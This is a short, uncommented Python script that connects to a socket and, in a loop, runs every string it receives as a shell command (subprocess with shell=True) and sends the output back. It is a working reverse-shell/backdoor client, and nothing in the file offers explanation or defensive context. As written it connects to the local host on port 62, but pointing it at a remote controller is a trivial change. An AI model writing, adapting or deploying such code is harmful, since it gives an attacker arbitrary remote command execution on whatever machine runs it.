import socket
import sys
import os
import time as T
import subprocess
sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host=socket.gethostname()
port=62
buffer=2048
addr=(host,port)
try:
	sock.connect(addr)
except socket.error as msg:
	print(str(msg))
	sock.connect(addr)

while 1:
	data=sock.recv(buffer).decode('utf-8')
	cmd=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
	out=cmd.stdout.read()+cmd.stderr.read()
	if data=='exit':
		sock.close()
		sys.exit()

		
	sock.send(out)

sock.close()	